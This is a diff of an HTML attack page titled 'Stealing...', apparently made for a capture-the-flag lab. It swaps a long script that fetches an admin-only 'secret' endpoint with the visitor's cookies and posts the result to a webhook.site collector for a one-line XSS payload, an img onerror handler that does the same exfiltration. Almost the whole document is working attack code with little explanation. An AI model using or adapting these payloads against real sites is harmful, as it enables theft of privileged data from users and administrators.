@@ -6,49 +6,6 @@
 </head>
 <body>
     <h1>Stealing...</h1>
-    <script>
-        (async function () {
-            const webhookUrl = "https://webhook.site/0a90930c-2196-4924-aac4-470557244914";
-            const flagUrl = "https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech/api/admin/sup3rs3cr3t";
-
-            try {
-                // Gửi GET để lấy FLAG
-                const flagResponse = await fetch(flagUrl, {
-                    method: "GET",
-                    credentials: "include", // Cho phép gửi cookie nếu cần
-                    headers: {
-                        "Accept": "application/json"
-                    }
-                });
-
-                const flagData = await flagResponse.json();
-
-                // Gửi FLAG về Webhook bằng POST
-                await fetch(webhookUrl, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                        stage: "FLAG_RETRIEVED",
-                        flag: flagData
-                    })
-                });
-            } catch (error) {
-                // Báo lỗi nếu có
-                await fetch(webhookUrl, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                        stage: "ERROR",
-                        message: error.message,
-                        stack: error.stack
-                    })
-                });
-            }
-        })();
-    </script>
+  <img src=x onerror="fetch('https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech/api/admin/sup3rs3cr3t').then(r=>r.text()).then(d=>fetch('https://webhook.site/0a90930c-2196-4924-aac4-470557244914',{method:'POST',body:d}))">//
 </body>
 </html>
